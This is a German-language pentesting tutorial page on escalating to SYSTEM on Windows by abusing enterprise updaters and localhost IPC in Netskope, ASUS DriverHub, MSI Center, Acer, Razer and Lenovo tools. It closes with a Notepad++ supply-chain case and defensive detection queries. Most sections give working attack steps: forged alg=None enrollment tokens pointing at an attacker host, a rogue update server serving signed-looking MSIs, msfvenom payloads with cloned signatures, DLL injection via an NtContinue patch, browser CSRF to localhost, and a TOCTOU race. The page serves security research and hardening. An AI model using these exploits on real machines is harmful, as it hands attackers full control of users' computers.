# Missbrauch von Enterprise Auto-Updaters und privilegiertem IPC (z.B. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Diese Seite verallgemeinert eine Klasse von Windows local privilege escalation-Ketten, die in enterprise endpoint agents und Updaters gefunden wurden, die eine low-friction IPC-Schnittstelle und einen privilegierten Update-Flow bereitstellen. Ein repräsentatives Beispiel ist Netskope Client for Windows < R129 (CVE-2025-0309), bei dem ein low-privileged user ein Enrollment zu einem vom Angreifer kontrollierten Server erzwingen und dann ein bösartiges MSI liefern kann, das der SYSTEM-Dienst installiert.

Wesentliche Ideen, die du gegen ähnliche Produkte wiederverwenden kannst:
- Missbrauche das localhost IPC eines privilegierten Dienstes, um ein Re-enrollment oder eine Reconfiguration zu einem Angreifer-Server zu erzwingen.
- Implementiere die Update-Endpunkte des Herstellers, liefere eine Rogue Trusted Root CA aus und verweise den Updater auf ein bösartiges, „signiertes“ Paket.
- Umgehe schwache Signer-Prüfungen (CN allow-lists), optionale Digest-Flags und lax gesetzte MSI-Properties.
- Wenn IPC „encrypted“ ist, leite den Key/IV aus für alle lesbaren Machine-Identifiers aus der Registry ab.
- Wenn der Dienst Caller durch Image Path/Process Name einschränkt, injiziere in einen allow-listed Prozess oder starte einen solchen suspended und boote deine DLL über einen minimalen Thread-Context-Patch.

---
## 1) Erzwingen eines Enrollments zu einem Angreifer-Server über localhost IPC

Viele Agents liefern einen User-Mode-UI-Prozess aus, der über localhost TCP per JSON mit einem SYSTEM-Dienst kommuniziert.

Beobachtet bei Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit-Flow:
1) Erzeuge ein JWT-Enrollment-Token, dessen Claims den Backend-Host steuern (z.B. AddonUrl). Verwende alg=None, damit keine Signatur erforderlich ist.
2) Sende die IPC-Nachricht, die den Provisioning-Command mit deinem JWT und Tenant-Namen aufruft:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Der Dienst beginnt, deinen Rogue-Server für enrollment/config anzusprechen, z. B.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Wenn die Caller-Verification pfad-/namenbasiert ist, starte die Anfrage von einem allow-listed Vendor-Binary aus (siehe §4).

---
## 2) Hijacking des update channel, um code als SYSTEM auszuführen

Sobald der client mit deinem server spricht, implementiere die erwarteten Endpoints und leite ihn zu einer attacker MSI. Typische Sequenz:

1) /v2/config/org/clientconfig → JSON config mit einem sehr kurzen updater interval zurückgeben, z. B.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Gibt ein PEM-CA-Zertifikat zurück. Der Service installiert es in den Local Machine Trusted Root store.
3) /v2/checkupdate → Liefert Metadaten, die auf eine malicious MSI und eine Fake-Version zeigen.

Bypassing common checks seen in the wild:
- Signer CN allow-list: Der Service prüft möglicherweise nur, ob der Subject CN gleich “netSkope Inc” oder “Netskope, Inc.” ist. Deine rogue CA kann ein Leaf mit genau diesem CN ausstellen und die MSI signen.
- CERT_DIGEST property: Füge eine harmlose MSI-Eigenschaft namens CERT_DIGEST hinzu. Keine Durchsetzung beim Install.
- Optional digest enforcement: Ein config-Flag (z. B. check_msi_digest=false) deaktiviert zusätzliche kryptografische Validierung.

Result: Der SYSTEM service installiert deine MSI aus
C:\ProgramData\Netskope\stAgent\data\*.msi
und führt beliebigen Code als NT AUTHORITY\SYSTEM aus.

Patch-bypass lesson: Wenn ein Vendor mit einem kleinen Satz „trusted“ Domains antwortet statt die Update-Quelle kryptografisch zu authentifizieren, suche nach vendor-owned Redirectors oder Reverse Proxies, die dir trotzdem erlauben, Traffic zu steuern. Im Fall von Netskope zeigte öffentliche Follow-up research, dass eine R129-era Allow-list weiterhin über `rproxy.goskope.com` missbraucht werden konnte, das attacker-controlled Azure App Service Content proxied. Behandle Hostname-Allow-lists als Speed bump, nicht als trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

Ab R127 verpackte Netskope IPC-JSON in einem encryptData-Feld, das wie Base64 aussieht. Reverse Engineering zeigte AES mit Key/IV, die aus Registry-Werten abgeleitet werden, die für jeden User lesbar sind:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Angreifer können die Verschlüsselung reproduzieren und gültige verschlüsselte Commands von einem Standarduser senden. Allgemeiner Tipp: Wenn ein Agent plötzlich sein IPC „verschlüsselt“, suche unter HKLM nach device IDs, product GUIDs, install IDs als Material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Manche Services versuchen, den Peer zu authentifizieren, indem sie die PID der TCP-Connection auflösen und den image path/name mit allow-listed Vendor-Binaries vergleichen, die unter Program Files liegen (z. B. stagentui.exe, bwansvc.exe, epdlp.exe).

Zwei praktische Bypasses:
- DLL injection in einen allow-listed Prozess (z. B. nsdiag.exe) und IPC von innen heraus proxien.
- Einen allow-listed binary suspended starten und deine Proxy-DLL ohne CreateRemoteThread bootstrappen (siehe §5), um driver-enforced tamper rules zu erfüllen.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Produkte liefern oft einen minifilter/OB callbacks driver (z. B. Stadrv) mit, um gefährliche Rechte von Handles auf protected processes zu entfernen:
- Process: entfernt PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beschränkt auf THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ein zuverlässiger user-mode loader, der diese constraints respektiert:
1) CreateProcess eines Vendor-Binaries mit CREATE_SUSPENDED.
2) Handles holen, die du noch nutzen darfst: PROCESS_VM_WRITE | PROCESS_VM_OPERATION auf den Prozess, und ein Thread-Handle mit THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oder nur THREAD_RESUME, wenn du Code an einem bekannten RIP patchst).
3) ntdll!NtContinue (oder einen anderen frühen, garantiert gemappten thunk) mit einem kleinen Stub überschreiben, der LoadLibraryW auf deinen DLL-Pfad aufruft und dann zurückspringt.
4) ResumeThread, um deinen Stub im Prozess auszulösen und deine DLL zu laden.

Da du nie PROCESS_CREATE_THREAD oder PROCESS_SUSPEND_RESUME auf einem bereits geschützten Prozess verwendet hast (du hast ihn selbst erstellt), ist die Policy des Drivers erfüllt.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatisiert eine rogue CA, malicious MSI signing und bedient die benötigten Endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope ist ein custom IPC client, der beliebige (optional AES-encrypted) IPC-Nachrichten erzeugt und die suspended-process injection enthält, um von einem allow-listed binary aus zu stammen.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Wenn du einer neuen Endpoint-Agent- oder Motherboard-“helper”-Suite gegenüberstehst, reicht oft ein schneller Workflow, um zu erkennen, ob du ein vielversprechendes privesc target vor dir hast:

1) Loopback-Listener auflisten und sie auf Vendor-Prozesse zurückführen:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Kandidaten für named pipes aufzählen:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Registry-gestützte Routing-Daten auswerten, die von plugin-basierten IPC-Servern verwendet werden:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extrahiere zuerst Endpoint-Namen, JSON-Keys und Command-IDs aus dem User-Mode-Client. Gepackte Electron/.NET-Frontends leaken häufig das vollständige Schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Suche nach dem tatsächlichen Trust-Predicate, nicht nur dem Codepfad, der schließlich den Prozess startet:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Muster, die es wert sind, priorisiert zu werden:
- `CryptQueryObject`/certificate parsing ohne `WinVerifyTrust` bedeutet meist, dass „certificate exists“ als „certificate is trusted“ behandelt wurde, was certificate cloning oder andere fake-signer-Tricks ermöglicht.
- Substring-/Suffix-Prüfungen über `Origin`, `Referer`, download URLs, process names oder signer CNs sind keine authentication. `contains(".vendor.com")` ist oft mit attacker-controlled lookalike domains ausnutzbar.
- Wenn die GUI mit niedrigen Rechten entscheidet „the file is trusted“ und der SYSTEM broker lediglich dieses Ergebnis übernimmt, umgeht das Patchen oder Reimplementieren der client-side DLL/JS oft die Grenze vollständig (Razer-style split validation).
- Wenn der broker ein Payload nach `%TEMP%`/`C:\Windows\Temp` kopiert und es dann von diesem Pfad aus validiert oder scheduled, teste sofort auf TOCTOU replacement windows und auf sibling plugin modules, die alternative `ExecuteTask()`-Wrapper mit schwächeren Checks bereitstellen.

Bei Zielen mit starkem Pipe-Einsatz ist PipeViewer eine schnelle Möglichkeit, schwache DACLs und remote erreichbare pipes zu finden, bevor du das protocol im Detail reverse-engineerst.

Wenn das Ziel Caller nur per PID, image path oder process name authentifiziert, behandle das eher als speed bump als als Grenze: Injektion in den legitimen client oder die Verbindung von einem allow-listed process aus reicht oft schon, um die Checks des servers zu erfüllen. Für named pipes speziell behandelt [diese Seite über client impersonation und pipe abuse](named-pipe-client-impersonation.md) das Primitive genauer.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

Eine neuere Variante, nach der es sich zu suchen lohnt, ist der **signed-client RPC broker**: Ein niedrig privilegierter, von Lenovo signierter Desktop-Prozess spricht mit einem SYSTEM service, und der service leitet JSON-Befehle an eine Reihe von XML-beschriebenen add-ins unter `%ProgramData%` weiter. Sobald code execution **innerhalb eines akzeptierten signierten clients** erreicht ist, wird jeder `runas="system"`-Vertrag Teil deiner attack surface.

Wichtige primitives aus der Lenovo-Vantage-Research:
- **Dem Caller vertrauen, weil er vom vendor signiert ist**: Forschende erreichten einen authentifizierten Kontext, indem sie eine von Lenovo signierte EXE in ein beschreibbares Verzeichnis kopierten und einen DLL side-load (`profapi.dll`) erfüllten, sodass beliebiger Code in einem client lief, dem der service bereits vertraute.
- **Manifest-gesteuerte attack surface discovery**: add-ins werden unter `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` deklariert; mehrere contracts laufen als `SYSTEM`, daher offenbart das Enumerieren dieser Manifeste oft die eigentlichen privilegierten verbs schneller als das Reversen des brokers selbst.
- **Per-command bugs hinter dem authentifizierten Kanal**: Nachdem man im vertrauenswürdigen client ist, fand die öffentliche Forschung path-traversal + race conditions in update/install verbs, raw-SQL-Missbrauch in privilegierten settings-Datenbanken und substring-basierte registry path checks, die Writes außerhalb des beabsichtigten hives ermöglichten.

Nützliche recon auf einem Ziel:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Praktischer Takeaway: Wann immer eine Helper-Suite einen Broker anbietet, der zuerst den **caller process** authentifiziert und erst dann in Dutzende von Plugin-/Add-in-Commands verzweigt, hör nicht nach dem Umgehen der Front-Door-Trust-Prüfung auf. Dump die Manifest-/Contract-Tabelle und fuzz jeden High-Privilege-Verb separat; der authentifizierte Channel versteckt meist mehrere Second-Stage-Bugs.

---
## 1) Browser-to-localhost CSRF gegen privilegierte HTTP APIs (ASUS DriverHub)

DriverHub liefert einen User-Mode-HTTP-Service (ADU.exe) auf 127.0.0.1:53000 aus, der Browser-Calls von https://driverhub.asus.com erwartet. Der Origin-Filter führt einfach `string_contains(".asus.com")` über den Origin-Header und über Download-URLs aus, die von `/asus/v1.0/*` bereitgestellt werden, aus. Jeder attacker-kontrollierte Host wie `https://driverhub.asus.com.attacker.tld` besteht daher die Prüfung und kann state-changing Requests per JavaScript senden. Siehe [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) für zusätzliche Bypass-Patterns.

Praktischer Ablauf:
1) Registriere eine Domain, die `.asus.com` einbettet, und hoste dort eine malicious Webseite.
2) Nutze `fetch` oder XHR, um einen privilegierten Endpoint (z. B. `Reboot`, `UpdateApp`) auf `http://127.0.0.1:53000` aufzurufen.
3) Sende den JSON-Body, den der Handler erwartet – das gepackte Frontend-JS zeigt das Schema unten.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Sogar die unten gezeigte PowerShell-CLI funktioniert, wenn der Origin-Header auf den vertrauenswürdigen Wert gespooft wird:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Jeder Browser-Besuch der Angreifer-Site wird damit zu einem 1-Click- (oder 0-Click via `onload`) lokalen CSRF, der einen SYSTEM Helper ausführt.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` lädt beliebige Executables herunter, die im JSON-Body definiert sind, und cached sie in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Die Validierung der Download-URL verwendet dieselbe Substring-Logik, daher wird `http://updates.asus.com.attacker.tld:8000/payload.exe` akzeptiert. Nach dem Download prüft ADU.exe nur, dass das PE eine Signatur enthält und dass der Subject-String mit ASUS übereinstimmt, bevor es ausgeführt wird – kein `WinVerifyTrust`, keine Chain-Validierung.

Um den Ablauf zu weaponize:
1) Erstelle ein Payload (z. B. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s Signer hinein (z. B. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hoste `pwn.exe` auf einer `.asus.com` Lookalike-Domain und trigger UpdateApp via das Browser-CSRF oben.

Da sowohl der Origin- als auch der URL-Filter auf Substrings basieren und die Signer-Prüfung nur Strings vergleicht, zieht DriverHub das Angreifer-Binary und führt es unter seinem erhöhten Kontext aus.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Centers SYSTEM-Service stellt ein TCP-Protokoll bereit, bei dem jedes Frame aus `4-byte ComponentID || 8-byte CommandID || ASCII arguments` besteht. Die Core-Komponente (Component ID `0f 27 00 00`) liefert `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` aus. Ihr Handler:
1) Kopiert das übergebene Executable nach `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifiziert die Signatur via `CS_CommonAPI.EX_CA::Verify` (Certificate Subject muss gleich “MICRO-STAR INTERNATIONAL CO., LTD.” sein und `WinVerifyTrust` muss erfolgreich sein).
3) Erzeugt einen Scheduled Task, der die Temp-Datei als SYSTEM mit angreiferkontrollierten Argumenten ausführt.

Die kopierte Datei ist zwischen Verifikation und `ExecuteTask()` nicht gesperrt. Ein Angreifer kann:
- Frame A senden, das auf ein legitimes MSI-signiertes Binary zeigt (garantiert, dass die Signaturprüfung besteht und der Task queued wird).
- Es mit wiederholten Frame-B-Messages race-en, die auf ein bösartiges Payload zeigen, und so `MSI Center SDK.exe` direkt nach Abschluss der Verifikation überschreiben.

Wenn der Scheduler auslöst, führt er das überschrieben Payload trotz Validierung der ursprünglichen Datei unter SYSTEM aus. Eine zuverlässige Ausnutzung nutzt zwei Goroutinen/Threads, die `CMD_AutoUpdateSDK` spammen, bis das TOCTOU-Fenster gewonnen ist.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Jedes Plugin/DLL, das von `MSI.CentralServer.exe` geladen wird, erhält eine Component ID, die unter `HKLM\SOFTWARE\MSI\MSI_CentralServer` gespeichert ist. Die ersten 4 Bytes eines Frames wählen diese Komponente aus, wodurch Angreifer Befehle an beliebige Module routen können.
- Plugins können eigene Task Runner definieren. `Support\API_Support.dll` exponiert `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` und ruft direkt `API_Support.EX_Task::ExecuteTask()` mit **keiner Signaturvalidierung** auf – jeder lokale User kann es auf `C:\Users\<user>\Desktop\payload.exe` zeigen lassen und deterministisch SYSTEM-Ausführung erhalten.
- Das Sniffen von Loopback mit Wireshark oder das Instrumentieren der .NET-Binaries in dnSpy zeigt die Component-↔-Command-Mapping schnell; benutzerdefinierte Go-/Python-Clients können dann Frames replayen.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exponiert `\\.\pipe\treadstone_service_LightMode`, und seine discretionary ACL erlaubt Remote-Clients (z. B. `\\TARGET\pipe\treadstone_service_LightMode`). Das Senden von Command ID `7` mit einem File Path ruft die Prozess-Start-Routine des Services auf.
- Die Client-Library serialisiert ein magisches Terminator-Byte (113) zusammen mit Args. Dynamische Instrumentierung mit Frida/`TsDotNetLib` (siehe [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) für Instrumentierungstipps) zeigt, dass der native Handler diesen Wert auf ein `SECURITY_IMPERSONATION_LEVEL` und ein Integrity SID mappt, bevor `CreateProcessAsUser` aufgerufen wird.
- Das Ersetzen von 113 (`0x71`) durch 114 (`0x72`) fällt in den generischen Branch, der das volle SYSTEM-Token behält und ein High-Integrity SID (`S-1-16-12288`) setzt. Das gestartete Binary läuft daher als uneingeschränktes SYSTEM, sowohl lokal als auch über Maschinen hinweg.
- Kombiniere das mit dem exponierten Installer-Flag (`Setup.exe -nocheck`), um ACC auch auf Lab-VMs bereitzustellen und die Pipe ohne Vendor-Hardware zu nutzen.

Diese IPC-Bugs zeigen, warum localhost-Services Mutual Authentication erzwingen müssen (ALPC SIDs, `ImpersonationLevel=Impersonation`-Filter, Token Filtering) und warum jeder „run arbitrary binary“-Helper eines Moduls dieselben Signer-Verifikationen teilen muss.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 hat ein weiteres nützliches Muster zu dieser Familie hinzugefügt: Ein User mit niedrigen Rechten kann einen COM-Helper bitten, einen Prozess über `RzUtility.Elevator` zu starten, während die Vertrauensentscheidung an eine User-Mode-DLL (`simple_service.dll`) delegiert wird, statt robust innerhalb der privilegierten Grenze durchgesetzt zu werden.

Beobachteter Exploitation-Pfad:
- Instanziiere das COM-Objekt `RzUtility.Elevator`.
- Rufe `LaunchProcessNoWait(<path>, "", 1)` auf, um einen erhöhten Start anzufordern.
- Im öffentlichen PoC wird die PE-Signature-Gate in `simple_service.dll` vor dem Senden der Anfrage gepatcht, wodurch ein beliebig gewähltes Angreifer-Executable gestartet werden kann.

Minimale PowerShell-Invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Allgemeine Erkenntnis: Beim Reversing von „Helper“-Suites nicht bei localhost-TCP oder named pipes aufhören. Nach COM-Klassen mit Namen wie `Elevator`, `Launcher`, `Updater` oder `Utility` suchen und dann prüfen, ob der privilegierte Service das Ziel-Binary tatsächlich validiert oder lediglich ein von einer patchbaren User-Mode-Client-DLL berechnetes Ergebnis vertraut. Dieses Muster geht über Razer hinaus: Jede Split-Design-Architektur, bei der der High-Privilege-Broker eine Allow/Deny-Entscheidung von der Low-Privilege-Seite übernimmt, ist ein potenzieller privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Zwischen Juni 2025 und Dezember 2025 lieferten Angreifer, die die Hosting-Infrastruktur hinter dem Notepad++ Update-Flow kompromittiert hatten, gezielt bösartige Manifeste an ausgewählte Opfer aus. Ältere auf WinGUp basierende Updater prüften die Update-Authentizität nicht vollständig, sodass eine feindliche XML-Antwort Clients auf vom Angreifer kontrollierte URLs umleiten konnte. Da der Client HTTPS-Inhalte akzeptierte, ohne sowohl eine vertrauenswürdige Zertifikatskette als auch eine gültige PE-Signatur des heruntergeladenen Installers zu erzwingen, luden Opfer ein trojanisiertes NSIS `update.exe` herunter und führten es aus.

Operational flow (kein lokaler Exploit erforderlich):
1. **Infrastructure interception**: CDN/Hosting kompromittieren und Update-Prüfungen mit Angreifer-Metadaten beantworten, die auf eine bösartige Download-URL verweisen.
2. **Trojanized NSIS**: Der Installer lädt eine Payload herunter/führt sie aus und missbraucht zwei execution chains:
- **Bring-your-own signed binary + sideload**: das signierte Bitdefender `BluetoothService.exe` mitliefern und eine bösartige `log.dll` in dessen Suchpfad ablegen. Wenn das signierte Binary läuft, sideloadet Windows `log.dll`, die den Chrysalis-Backdoor entschlüsselt und reflectively lädt (Warbird-protected + API hashing zur Erschwerung statischer Erkennung).
- **Scripted shellcode injection**: NSIS führt ein kompiliertes Lua-Skript aus, das Win32 APIs (z. B. `EnumWindowStationsW`) verwendet, um shellcode zu injizieren und Cobalt Strike Beacon zu stagen.

Hardening/detection takeaways für jeden auto-updater:
- **certificate + signature verification** des heruntergeladenen Installers erzwingen (Vendor-Signer pinnen, nicht passende CN/chain verwerfen) und das Update-Manifest selbst signieren (z. B. XMLDSig). Manifest-gesteuerte Redirects blockieren, sofern nicht validiert.
- **BYO signed binary sideloading** als Post-Download-Detection-Pivot behandeln: Alarmieren, wenn ein signiertes Vendor-EXE eine DLL mit einem Namen außerhalb seines kanonischen Installationspfads lädt (z. B. Bitdefender lädt `log.dll` aus Temp/Downloads) und wenn ein Updater Installer aus temp ablegt/ausführt, die keine Vendor-Signaturen haben.
- Auf **malware-specific artifacts** achten, die in dieser Chain beobachtet wurden (als generische Pivots nützlich): Mutex `Global\Jdhfv_1.0.1`, anomale `gup.exe`-Writes nach `%TEMP%`, und Lua-gesteuerte shellcode-injection stages.
- Notepad++ reagierte, indem WinGUp in v8.8.9 und später gehärtet wurde: Das zurückgegebene XML ist jetzt signiert (XMLDSig), und neuere Builds erzwingen certificate + signature verification des heruntergeladenen Installers, statt nur dem Transport zu vertrauen.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> startet einen Nicht-Notepad++-Installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Diese Muster verallgemeinern sich auf jeden Updater, der unsignierte Manifeste akzeptiert oder Signer von Installern nicht fest pinnt—Network Hijack + malicious installer + BYO-signed sideloading führt zu remote code execution unter dem Deckmantel von „trusted“ Updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
